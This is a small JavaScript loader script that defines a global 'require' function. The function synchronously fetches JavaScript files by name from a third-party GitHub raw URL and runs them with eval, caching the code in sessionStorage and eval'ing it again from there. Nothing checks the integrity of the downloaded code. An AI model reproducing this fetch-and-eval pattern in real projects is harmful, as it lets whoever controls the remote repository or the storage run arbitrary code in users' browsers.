// kr.js - SYNCHRONOUS CHAOS MODE
(async function() {
  if (window.KREQUIRE_LOADED) return;
  window.KREQUIRE_LOADED = true;

  const TOKEN_CDN = 'https://raw.githubusercontent.com/zhmguyalt/haha/main/other2/tokenz/';
  const cache = new Map();

  window.require = function(token) {  // NO ASYNC
    const cacheKey = `kreq_${token}`;
    
    if (cache.has(cacheKey)) {
      eval(cache.get(cacheKey));
      return;
    }
    
    const cached = sessionStorage.getItem(cacheKey);
    if (cached) {
      eval(cached);
      cache.set(cacheKey, cached);
      return;
    }

    // SYNCHRONOUS fetch
    const xhr = new XMLHttpRequest();
    xhr.open('GET', `${TOKEN_CDN}${token}.js`, false);  // false = synchronous
    xhr.send();
    
    if (xhr.status === 200) {
      const code = xhr.responseText;
      eval(code);
      sessionStorage.setItem(cacheKey, code);
      cache.set(cacheKey, code);
    } else {
      console.error(`Token ${token} not found`);
    }
  };

  window.kreq = window.require;
  console.log("require service made by kavikivi - SYNC MODE");
})();
